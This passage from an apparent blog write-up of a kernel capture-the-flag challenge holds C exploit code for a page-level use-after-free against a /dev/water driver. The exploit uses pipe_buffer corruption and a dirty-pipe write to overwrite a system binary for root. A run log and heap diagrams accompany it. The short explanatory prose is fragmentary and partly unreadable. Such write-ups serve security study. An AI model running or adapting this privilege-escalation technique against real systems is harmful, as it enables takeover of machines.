class="built_in">log_info</span>(<span class="string">&quot;page: %#llx&quot;</span>, (<span class="type">size_t</span>)info_pipe_buf.page);</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;ops: %#llx&quot;</span>, (<span class="type">size_t</span>)info_pipe_buf.ops);</span><br><span class="line">  <span class="built_in">debug</span>(<span class="string">&quot;debug&quot;</span>);</span><br><span class="line"></span><br><span class="line">  info_pipe_buf.flags |= PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line">  info_pipe_buf.offset = <span class="number">0</span>;</span><br><span class="line">  info_pipe_buf.len = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// pipe_buf</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[victim_idx][<span class="number">1</span>], &amp;info_pipe_buf, <span class="built_in">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;dirty pipe write target file&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SND_PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="built_in">write</span>(snd_pipe_fd[i][<span class="number">1</span>], payload, <span class="built_in">sizeof</span>(payload));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;write ook&quot;</span>);</span><br><span class="line">  <span class="built_in">close</span>(target_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">check</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> target_fd;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line">  <span class="keyword">if</span> ((target_fd = <span class="built_in">open</span>(target_file, O_RDONLY)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;open /bin/busybox&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">read</span>(target_fd, buffer, <span class="number">0x10</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(buffer, <span class="string">&quot;/bin/sh&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;do not write&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;/sbin/poweroff: %s&quot;</span>, buffer);</span><br><span class="line">  <span class="built_in">close</span>(target_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  dev_fd = <span class="built_in">open</span>(<span class="string">&quot;/dev/water&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;open /dev/water&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;cp /bin/sh /tmp/sh&quot;</span>);</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;cp /bin/cat /tmp/cat&quot;</span>);</span><br><span class="line">  <span class="built_in">page_level_uaf</span>();</span><br><span class="line">  <span class="built_in">debug</span>(<span class="string">&quot;pause after uaf&quot;</span>);</span><br><span class="line">  <span class="built_in">pipe_primitive</span>();</span><br><span class="line">  <span class="built_in">debug</span>(<span class="string">&quot;pause after dirty pipe&quot;</span>);</span><br><span class="line">  <span class="built_in">check</span>();</span><br><span class="line">  <span class="built_in">debug</span>(<span class="string">&quot;if see this, write ok&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Boot took 2.16 seconds</span><br><span class="line">/ $ ./exp</span><br><span class="line">[+] spray pipe</span><br><span class="line">[+] change ring_size make pipe-&gt;bufs kmalloc-512</span><br><span class="line">[+] kmalloc-512 hole</span><br><span class="line">[+] new chunk <span class="keyword">then</span> free</span><br><span class="line">write chunk data D</span><br><span class="line"></span><br><span class="line">[+] fill the hole</span><br><span class="line">[+] alloc pipe_buffer pages</span><br><span class="line">[+] uaf change pipe-&gt;bufs-&gt;page</span><br><span class="line">[+] find victim pipe</span><br><span class="line">[+] succeed find victim: 0, origin: 1</span><br><span class="line">pause after uaf</span><br><span class="line"></span><br><span class="line">[+] write pipe <span class="keyword">then</span> we can <span class="built_in">read</span></span><br><span class="line">[+] free origin pipe</span><br><span class="line">[+] fcntl to <span class="built_in">set</span> the pipe <span class="keyword">in</span> victim page</span><br><span class="line">[+] page: 0xffffea0000193140</span><br><span class="line">[+] ops: 0xffffffff82248500</span><br><span class="line">debug</span><br><span class="line"></span><br><span class="line">[+] dirty pipe write target file</span><br><span class="line">[+] write ook</span><br><span class="line">pause after dirty pipe</span><br><span class="line"></span><br><span class="line">/sbin/poweroff: <span class="comment">#!/tmp/sh</span></span><br><span class="line"> /tmp/@<span class="keyword">if</span> see this, write ok</span><br><span class="line"></span><br><span class="line">[   14.466663] BUG: Bad page state <span class="keyword">in</span> process exp  pfn:07714</span><br><span class="line">/ $ <span class="built_in">ls</span></span><br><span class="line">flag&#123;test_flag&#125;</span><br><span class="line">/bin/ls: line 3: syntax error: unexpected <span class="string">&quot;)&quot;</span></span><br></pre></td></tr></table></figure><h4 id="task-struct-cred"><a href="#task-struct-cred" class="headerlink" title="task struct cred"></a>task struct cred</h4><p> <code>modprobe_path</code></p><p>pipeidx</p><p>page-level-uaf</p><ul><li> uaf page  pipe1 &amp; pipe2 &amp; pipe3page uaf page  struct page </li><li>pipe1page offset + len </li><li>pipe2pipe3 </li><li>pipe3pipe1 &amp; pipe 2 </li><li> pipe_buffer  page offset  len </li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">origin |</span><br><span class="line">vimtim ---&gt; uaf page</span><br><span class="line">  +------------+</span><br><span class="line">  + pipe_bufsx +</span><br><span class="line">  +------------+</span><br><span class="line">  + pipe_bufsy + </span><br><span class="line">  +------------+</span><br><span class="line">  + pipe_bufsz +</span><br><span class="line">  +------------+</span><br><span class="line"></span><br><span class="line">pipe_bufs2  info_pipe_buf, victim  pipe_bufs3page</span><br><span class="line">origin |</span><br><span class="line">vimtim ---&gt; uaf page</span><br><span class="line">  +------------+</span><br><span class="line">  + pipe_bufsx +</span><br><span class="line">  +------------+</span><br><span class="line">  + pipe_bufsy + </span><br><span class="line">  +------------+</span><br><span class="line">  + pipe_bufsz + |</span><br><span class="line">  +------------+           |</span><br><span class="line">  +   ...      +           |</span><br><span class="line">  +------------+           |</span><br><span class="line">  + pipe_bufsn + --------------&gt; page</span><br><span class="line">  +------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">idx, page-level-uaf pipe_bufs  page</span><br><span class="line">origin |</span><br><span class="line">vimtim ---&gt; uaf page</span><br><span class="line">  +------------+</span><br><span class="line">  + pipe_bufsx +</span><br><span class="line">  +------------+</span><br><span class="line">  + pipe_bufsy + </span><br><span class="line">  +------------+</span><br><span class="line">  + pipe_bufsz + snd_victim|</span><br><span class="line">  +------------+                     |</span><br><span class="line">  +   ...      +                     |</span><br><span class="line">  +------------+                     |</span><br><span class="line">  + pipe_bufsn + snd_origin--------------&gt; uaf  page</span><br><span class="line">  +------------+                          +------------+</span><br><span class="line">              + pipe_bufs1 +</span><br><span class="line">                          +------------+</span><br><span class="line">                          + pipe_bufs2 + </span><br><span class="line">                          +------------+</span><br><span class="line">                          + pipe_bufs3 +</span><br><span class="line">                          +------------+</span><br><span class="line">                          + pipe_bufs4 +</span><br><span class="line">                          +------------+</span><br><span class="line">                          +     ...    +</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">snd_victim_idx  0, 1, 2, 3  pipe_buffer page len offsetpipe_bufs2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4  2  page  offset  len</span><br><span class="line">4  3  Y write  Z</span><br><span class="line">3  4 X</span><br></pre></td></tr></table></figure><p> page-level-uaf  break</p><p>exp </p><ul><li>info leak </li></ul><p><a href="https://blog.csdn.net/qq_61670993/article/details/134359694">2023-water-ker</a>exp</p><p>exp<del></del></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_SPRAY_NUMS 200</span></span><br><span class="line"><span class="comment">// kmalloc-cg-96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SND_PIPE_BUFS_SIZE 96</span></span><br><span class="line"><span class="comment">// kmalloc-cg-192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRD_PIPE_BUFS_SIZE 192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(fmt, ...) \</span></span><br><span class="line"><span class="meta">  dprintf(2, <span class="string">&quot;\033[32m[+] &quot;</span> fmt <span class="string">&quot;\033[0m\n&quot;</span>, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">page</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_inode_info</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">page</span> *page;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span> *ops;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span> &#123;</span><br><span class="line">  <span class="built_in">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">int</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">int</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> vmemmap_base = <span class="number">0xffffea0000000000</span>;</span><br><span class="line"><span class="type">size_t</span> page_offset_base = <span class="number">0xffff888000000000</span>;</span><br><span class="line"><span class="type">size_t</span> init_task, init_nsproxy, init_cred;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> spray_pipe_fd[PIPE_SPRAY_NUMS][<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"><span class="type">int</span> victim_idx = <span class="number">-1</span>, origin_idx = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> snd_victim_idx = <span class="number">-1</span>, snd_origin_idx = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> self_pipe_idx_2 = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> self_pipe_idx_3 = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> self_pipe_idx_4 = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> info_pipe_buf;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> evil_pipe_buf;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> evil_pipe_buf_2, evil_pipe_buf_3, evil_pipe_buf_4;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> temp_zero_buf[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">water_args</span> &#123;</span><br><span class="line">  <span class="type">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">new_chunk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">512</span>];</span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="number">0x44</span>, <span class="built_in">sizeof</span>(buffer));</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = buffer,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x20</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">delete_chunk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = <span class="literal">NULL</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x30</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">edit_chunk</span><span class="params">(<span class="type">char</span> c)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = &amp;c,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x50</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[-] error: %s&quot;</span>, msg);</span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">5</span>);</span><br><span class="line">  <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">debug</span><span class="params">(<span class="type">char</span> *msg)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(msg);</span><br><span class="line">  <span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> 